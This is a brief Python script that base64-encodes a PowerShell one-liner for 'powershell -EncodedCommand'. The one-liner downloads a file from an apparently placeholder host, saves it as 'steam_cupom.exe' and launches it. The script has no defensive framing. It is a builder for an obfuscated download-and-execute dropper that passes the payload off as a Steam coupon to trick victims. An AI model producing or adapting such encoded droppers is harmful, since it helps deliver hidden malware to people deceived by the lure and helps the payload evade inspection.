import base64

def to_base64_ps(command):
    encoded_bytes = command.encode("utf-16-le")
    encoded_b64 = base64.b64encode(encoded_bytes).decode()
    return encoded_b64

cmd = "Invoke-WebRequest -Uri 'http://test.com/download/cupom' -OutFile 'steam_cupom.exe'; Start-Process 'steam_cupom.exe'"
print(to_base64_ps(cmd))

# powershell -EncodedCommand <base64>